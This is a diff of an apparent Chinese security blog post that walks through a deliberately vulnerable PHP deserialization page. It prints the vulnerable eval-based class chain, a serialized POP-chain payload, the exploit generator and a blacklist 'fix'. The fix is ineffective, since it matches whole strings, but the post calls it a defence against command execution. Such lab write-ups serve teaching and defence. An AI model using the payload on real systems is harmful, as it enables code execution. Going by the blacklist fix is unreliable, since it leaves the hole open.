@@ -356,14 +356,145 @@
 <p>代码对于传入的\$target参数没有进行任何过滤和限制，直接拼接到了ping命令语句的后面，这样就导致攻击者可以利用Linux下的管道符执行自己的恶意命令，从而造成命令注入漏洞。</p>
 <h2 id="2-10-反序列化"><a href="#2-10-反序列化" class="headerlink" title="2.10 反序列化"></a>2.10 反序列化</h2><h3 id="2-10-1-漏洞复现"><a href="#2-10-1-漏洞复现" class="headerlink" title="2.10.1 漏洞复现"></a>2.10.1 漏洞复现</h3><p>对于反序列化漏洞，由于不好结合到实际功能中，因此在管理员后台单独实现该漏洞的页面，如下：  </p>
 <p><img src="/2020/06/09/YXJCMS/0799c9e80381a7fce9ceed4198500f8d.png" alt="在这里插入图片描述"></p>
-<p>构造的反序列化payload如下：<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:29</span><span class="selector-pseudo">:"app</span>\<span class="selector-tag">admin</span>\<span class="selector-tag">controller</span>\<span class="selector-tag">start_gg</span>"<span class="selector-pseudo">:1</span>:&#123;<span class="attribute">s</span>:<span class="number">4</span>:<span class="string">"mod1"</span>;<span class="attribute">O</span>:<span class="number">25</span>:<span class="string">"app\admin\controller\Call"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"mod1"</span>;<span class="attribute">O</span>:<span class="number">26</span>:<span class="string">"app\admin\controller\funct"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"mod1"</span>;<span class="attribute">O</span>:<span class="number">25</span>:<span class="string">"app\admin\controller\func"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"mod1"</span>;<span class="attribute">O</span>:<span class="number">28</span>:<span class="string">"app\admin\controller\string1"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"str1"</span>;<span class="attribute">O</span>:<span class="number">28</span>:<span class="string">"app\admin\controller\GetFlag"</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">"cmd"</span>;<span class="attribute">s</span>:<span class="number">10</span>:<span class="string">"phpinfo();"</span>;&#125;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure></p>
-<p>提交上述payload后可以看到成功执行了phpinfo():</p>
+<p>构造的反序列化payload如下：  </p>
+<pre><code>O:29:&quot;app\admin\controller\start_gg&quot;:1:{s:4:&quot;mod1&quot;;O:25:&quot;app\admin\controller\Call&quot;:1:{s:4:&quot;mod1&quot;;O:26:&quot;app\admin\controller\funct&quot;:1:{s:4:&quot;mod1&quot;;O:25:&quot;app\admin\controller\func&quot;:1:{s:4:&quot;mod1&quot;;O:28:&quot;app\admin\controller\string1&quot;:1:{s:4:&quot;str1&quot;;O:28:&quot;app\admin\controller\GetFlag&quot;:1:{s:3:&quot;cmd&quot;;s:10:&quot;phpinfo();&quot;;}}}}}}
+</code></pre><p>提交上述payload后可以看到成功执行了phpinfo():</p>
 <p><img src="/2020/06/09/YXJCMS/f43efe507c3f179e6b3e9d8bd05f7fcd.png" alt></p>
 <h3 id="2-10-2-代码分析"><a href="#2-10-2-代码分析" class="headerlink" title="2.10.2 代码分析"></a>2.10.2 代码分析</h3><p>该反序列漏洞的源码如下：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">admin</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Serialize</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (request()-&gt;isPost())&#123;</span><br><span class="line">            $payload = <span class="keyword">$this</span>-&gt;request-&gt;post(<span class="string">'payload'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        unserialize($payload);</span><br><span class="line">        $code = file_get_contents(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;assign(<span class="string">'code'</span>, $code);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fetch();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">start_gg</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1-&gt;test1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Call</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1-&gt;test2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">funct</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($test2,$arr)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $s1 = <span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">        $s1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span> //把对象当函数调用</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod2 = <span class="string">"字符串拼接"</span>.<span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">string1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $str1;</span><br><span class="line">    <span class="keyword">public</span> $str2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str1-&gt;get_flag();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"1"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $cmd;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+
+namespace app\admin\controller;
+use think\Controller;
+
+class Serialize extends Controller
+{
+    public function index()
+    {
+        if (request()-&gt;isPost()){
+            $payload = $this-&gt;request-&gt;post(&#39;payload&#39;);
+        }
+        unserialize($payload);
+        $code = file_get_contents(__FILE__);
+        $this-&gt;assign(&#39;code&#39;, $code);
+        return $this-&gt;fetch();
+    }
+}
+class start_gg
+{
+    public $mod1;
+    public $mod2;
+    public function __destruct()
+    {
+        $this-&gt;mod1-&gt;test1();
+    }
+}
+class Call
+{
+    public $mod1;
+    public $mod2;
+    public function test1()
+    {
+        $this-&gt;mod1-&gt;test2();
+    }
+}
+class funct
+{
+    public $mod1;
+    public $mod2;
+    public function __call($test2,$arr)
+    {
+        $s1 = $this-&gt;mod1;
+        $s1();
+    }
+}
+class func
+{
+    public $mod1;
+    public $mod2;
+    public function __invoke() //把对象当函数调用
+    {
+        $this-&gt;mod2 = &quot;字符串拼接&quot;.$this-&gt;mod1;
+    }
+}
+class string1
+{
+    public $str1;
+    public $str2;
+    public function __toString()
+    {
+        $this-&gt;str1-&gt;get_flag();
+        return &quot;1&quot;;
+    }
+}
+class GetFlag
+{
+    public $cmd;
+    public function get_flag()
+    {
+        eval($this-&gt;cmd);
+    }
+}
+?&gt;
+</code></pre>
 <p>攻击的方式是想办法调用GetFlag类的里的get_flag()方法中的eval函数，在string1类我们可以看到，只要把\$str1实例化为GetFlag类的对象，然后调用想办法调用<strong>toString()方法即可，那就找有没有地方把对象当作字符串了。往上看，func类的</strong>invoke()方法中有用.来进行字符串拼接的代码，那么只要把\$mod1实例化为string类的对象，然后再调用该<strong>invoke()方法即可，那就找有没有地方把对象当作函数来调用了。发现在funct类的</strong>call()中有\$s1();可以利用，只需要把\$mod1实例化为func类的对象，然后再调用该<strong>call()方法，那就找哪里调用了未声明的函数。再Call类中的test1()方法调用了不存在的test2()方法，所以只需要把\$mod1实例化为funct类的对象，然后再调用该test1()方法。看到在start_gg类中的</strong>destruct()方法中正好调用了test1()方法，那么只要\$mod1实例化为Call类的对象即可。想要调用start_gg类中的<strong>destruct()方法，只有实例化一个它的对象即可，这个对象在销毁时会自动调用</strong>destruct()函数。</p>
 <p>根据上述思路，写出exp如下：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">admin</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">start_gg</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> Call();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Call</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> funct();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">funct</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> func();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> string1();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">string1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $str1;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;str1 = <span class="keyword">new</span> GetFlag();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $cmd;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;cmd = <span class="string">'phpinfo();'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> start_gg();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+namespace app\admin\controller;
+use think\Controller;
+
+class start_gg
+{
+        public $mod1;
+        public function __construct()
+        {
+            $this-&gt;mod1 = new Call();
+        }
+}
+class Call
+{
+        public $mod1;
+        public function __construct()
+        {
+            $this-&gt;mod1 = new funct();
+        }
+}
+class funct
+{
+        public $mod1;
+        public function __construct()
+        {
+            $this-&gt;mod1 = new func();
+        }
+}
+class func
+{
+        public $mod1;
+        public function __construct()
+        {
+            $this-&gt;mod1 = new string1();
+        }
+}
+class string1
+{
+        public $str1;
+        public function __construct()
+        {
+            $this-&gt;str1 = new GetFlag();
+        }
+}
+class GetFlag
+{
+    public $cmd;
+    public function __construct()
+    {
+        $this-&gt;cmd = &#39;phpinfo();&#39;;
+    }
+}
+
+$a = new start_gg();
+echo serialize($a);
+?&gt;
+</code></pre>
 <p>运行上述exp.php即可得到payload。</p>
 <h1 id="3-漏洞修复"><a href="#3-漏洞修复" class="headerlink" title="3 漏洞修复"></a>3 漏洞修复</h1><h2 id="3-1-文件包含漏洞"><a href="#3-1-文件包含漏洞" class="headerlink" title="3.1 文件包含漏洞"></a>3.1 文件包含漏洞</h2><p>对于文件包含漏洞的修复方式，一种是避免不必要的文件包含或者是直接将要包含的文件名写死在代码中。另一种就是采取白名单的方式，将需要包含的文件名放在一个白名单中，当进行文件包含前，先判断要包含的文件名是否出现在白名单内，若未出现在白名单中，则不允许包含。</p>
 <p>这样采取白名单限制的方式，可以说是一种比较安全的修复方式了，具体修复代码如下：</p>
@@ -409,12 +540,118 @@
 <p><img src="/2020/06/09/YXJCMS/f750d2be5247ea82c185b610e04c1f0d.png" alt></p>
 <h2 id="3-10-反序列化"><a href="#3-10-反序列化" class="headerlink" title="3.10 反序列化"></a>3.10 反序列化</h2><p>对于反序列化漏洞来说，没有特别针对的防御与修复方式，唯一安全的架构模式是不接受来自不受信源的序列化对象，或使用只允许原始数据类型的序列化，即尽量不要直接反序列化用户传入的序列化串。其次是尽量不要使用eval、system等PHP敏感函数，或者函数的参数不可控。如果不能满足上述情况，那么就需要对传入敏感函数的参数进行严格的过滤，如不允许传入命令执行有关的操作，只允许传入我们指定的操作。</p>
 <p>修复后的反序列化代码如下：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">admin</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Serialize</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (request()-&gt;isPost()) &#123;</span><br><span class="line">            $payload = <span class="keyword">$this</span>-&gt;request-&gt;post(<span class="string">'payload'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        unserialize($payload);</span><br><span class="line">        $code = file_get_contents(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;assign(<span class="string">'code'</span>, $code);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fetch();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">start_gg</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1-&gt;test1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Call</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1-&gt;test2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">funct</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($test2, $arr)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $s1 = <span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">        $s1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod2 = <span class="string">"字符串拼接"</span> . <span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">string1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $str1;</span><br><span class="line">    <span class="keyword">public</span> $str2;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str1-&gt;get_flag();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"1"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $cmd;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $blacklist = [<span class="string">'phpinfo'</span>, <span class="string">'dl'</span>, <span class="string">'exec'</span>, <span class="string">'system'</span>, <span class="string">'passthru'</span>, <span class="string">'popen'</span>, <span class="string">'pclose, proc_open'</span>, <span class="string">'proc_nice'</span>, <span class="string">'leak'</span>,</span><br><span class="line">            <span class="string">'proc_terminate'</span>, <span class="string">'proc_get_status'</span>, <span class="string">'proc_close'</span>, <span class="string">'apache_child_terminate'</span>, <span class="string">'escapeshellcmd'</span>, <span class="string">'shell_exec'</span>,</span><br><span class="line">            <span class="string">'crack_check'</span>, <span class="string">'crack_closedict'</span>, <span class="string">'crack_getlastmessage'</span>, <span class="string">'crack_opendict'</span>, <span class="string">'psockopen'</span>, <span class="string">'symlink'</span>,</span><br><span class="line">            <span class="string">'ini_restore'</span>, <span class="string">'posix_getpwuid'</span>, <span class="string">'pfsockopen'</span>, <span class="string">'file_get_contents'</span>, <span class="string">'file_put_contents'</span>, <span class="string">'readfile'</span>];</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="keyword">$this</span>-&gt;cmd, $blacklist)) &#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+
+namespace app\admin\controller;
+use think\Controller;
+
+class Serialize extends Controller
+{
+    public function index()
+    {
+        if (request()-&gt;isPost()) {
+            $payload = $this-&gt;request-&gt;post(&#39;payload&#39;);
+        }
+        unserialize($payload);
+        $code = file_get_contents(__FILE__);
+        $this-&gt;assign(&#39;code&#39;, $code);
+        return $this-&gt;fetch();
+    }
+}
+
+class start_gg
+{
+    public $mod1;
+    public $mod2;
+
+    public function __destruct()
+    {
+        $this-&gt;mod1-&gt;test1();
+    }
+}
+
+class Call
+{
+    public $mod1;
+    public $mod2;
+
+    public function test1()
+    {
+        $this-&gt;mod1-&gt;test2();
+    }
+}
+
+class funct
+{
+    public $mod1;
+    public $mod2;
+
+    public function __call($test2, $arr)
+    {
+        $s1 = $this-&gt;mod1;
+        $s1();
+    }
+}
+
+class func
+{
+    public $mod1;
+    public $mod2;
+
+    public function __invoke()
+    {
+        $this-&gt;mod2 = &quot;字符串拼接&quot; . $this-&gt;mod1;
+    }
+}
+
+class string1
+{
+    public $str1;
+    public $str2;
+
+    public function __toString()
+    {
+        $this-&gt;str1-&gt;get_flag();
+        return &quot;1&quot;;
+    }
+}
+
+class GetFlag
+{
+    public $cmd;
+
+    public function get_flag()
+    {
+        $blacklist = [&#39;phpinfo&#39;, &#39;dl&#39;, &#39;exec&#39;, &#39;system&#39;, &#39;passthru&#39;, &#39;popen&#39;, &#39;pclose, proc_open&#39;, &#39;proc_nice&#39;, &#39;leak&#39;,
+            &#39;proc_terminate&#39;, &#39;proc_get_status&#39;, &#39;proc_close&#39;, &#39;apache_child_terminate&#39;, &#39;escapeshellcmd&#39;, &#39;shell_exec&#39;,
+            &#39;crack_check&#39;, &#39;crack_closedict&#39;, &#39;crack_getlastmessage&#39;, &#39;crack_opendict&#39;, &#39;psockopen&#39;, &#39;symlink&#39;,
+            &#39;ini_restore&#39;, &#39;posix_getpwuid&#39;, &#39;pfsockopen&#39;, &#39;file_get_contents&#39;, &#39;file_put_contents&#39;, &#39;readfile&#39;];
+        if (!in_array($this-&gt;cmd, $blacklist)) {
+            eval($this-&gt;cmd);
+        }
+    }
+}
+?&gt;
+</code></pre>
 <p>使用黑名单过滤的方式，对传入的\$cmd进行过滤，若只有其不在黑名单的敏感函数操作中时才能执行eval函数，这样就避免了攻击者利用反序列化进行命令执行、文件读取等危险操作，一定程度上防御了反序列化漏洞。</p>
